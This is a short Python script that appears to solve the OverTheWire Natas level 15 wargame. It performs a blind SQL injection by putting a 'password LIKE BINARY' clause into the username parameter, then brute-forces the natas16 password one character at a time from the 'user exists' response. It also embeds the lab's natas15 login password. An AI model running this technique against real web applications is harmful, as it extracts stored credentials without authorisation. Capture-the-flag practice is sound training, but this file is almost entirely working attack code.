import requests

CHARACTER_LIST = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
bf = ''

for i in range(1, 33):
    for char in CHARACTER_LIST:
        r = requests.get("http://natas15.natas.labs.overthewire.org/?debug&username=natas16%22%20and%20password%20LIKE%20BINARY%20%22" + bf + char + "%", auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
        if 'user exists' in r.text:
            bf = bf + char
            break
    print bf
